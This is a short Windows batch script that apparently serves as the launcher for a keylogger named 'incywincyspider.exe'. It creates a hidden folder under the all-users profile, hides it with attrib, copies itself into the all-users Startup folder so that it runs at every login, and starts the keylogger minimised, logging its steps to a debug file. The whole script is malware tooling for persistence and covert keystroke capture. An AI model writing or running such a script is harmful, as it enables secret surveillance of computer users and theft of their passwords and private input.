@echo off
echo Starting script... >> C:\temp\debug.log
set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\incywincyspider.exe"
set "STARTUP_PATH=%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp\incywincyspider_starter.cmd"
echo KEYLOGGER_PATH: %KEYLOGGER_PATH% >> C:\temp\debug.log
echo STARTUP_PATH: %STARTUP_PATH% >> C:\temp\debug.log
mkdir "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" 2>nul
attrib +h "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" >nul
copy "%~f0" "%STARTUP_PATH%" >nul
if exist "%KEYLOGGER_PATH%" (
    echo File exists, attempting to run... >> C:\temp\debug.log
    start /min "" "%KEYLOGGER_PATH%"
    echo Run command executed. >> C:\temp\debug.log
) else (
    echo Error: Keylogger file not found! >> C:\temp\debug.log
)
echo Script ended. >> C:\temp\debug.log
exit
